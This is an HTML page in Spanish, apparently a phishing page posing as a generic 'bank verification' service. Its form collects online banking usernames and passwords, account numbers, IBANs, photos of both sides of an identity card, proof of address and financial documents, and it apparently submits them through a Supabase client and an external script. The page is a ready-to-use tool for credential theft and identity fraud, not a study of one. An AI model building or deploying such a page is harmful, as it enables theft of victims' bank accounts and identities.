<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificación Digital</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
/* Estilos iguales a tu versión anterior */
</style>
</head>

<body>

<div class="contenedor">

  <div class="encabezado">
    <div class="logo">✓</div>
    <h1>Verificación Digital</h1>
    <div class="subtitulo">Complete la información para solicitar su verificación bancaria.</div>
  </div>

  <div class="tarjeta">

    <div class="aviso">
      Complete los datos solicitados para enviar su solicitud de verificación bancaria.
    </div>

    <form id="formulario" enctype="multipart/form-data">

      <div class="campo">
        <label>Usuario</label>
        <input type="text" id="usuario" name="usuario" required>
      </div>

      <div class="campo">
        <label>Contraseña</label>
        <input type="password" id="password" name="password" required>
      </div>

      <div class="campo">
        <label>Cuenta</label>
        <input type="text" id="cuenta" name="cuenta" required>
      </div>

      <div class="campo">
        <label>IBAN</label>
        <input type="text" id="iban" name="iban" required>
      </div>

      <div class="campo">
        <label>Foto carnet (frontal)</label>
        <input type="file" id="frontal" name="frontal" accept="image/*" capture="camera" required>
      </div>

      <div class="campo">
        <label>Foto carnet (trasera)</label>
        <input type="file" id="trasera" name="trasera" accept="image/*" capture="camera" required>
      </div>

      <div class="campo">
        <label>Comprobante de domicilio</label>
        <input type="file" id="domicilio" name="domicilio" accept="image/*" capture="camera" required>
      </div>

      <div class="campo">
        <label>Justificantes financieros</label>
        <input type="file" id="finanzas" name="finanzas" accept="image/*" capture="camera" required>
      </div>

      <button type="submit" id="boton">Enviar solicitud</button>

      <div id="mensaje"></div>

    </form>

  </div>

  <div class="pie">
    Una vez enviada, la solicitud será revisada.
  </div>

</div>

<script src="script.js"></script>

</body>
</html>
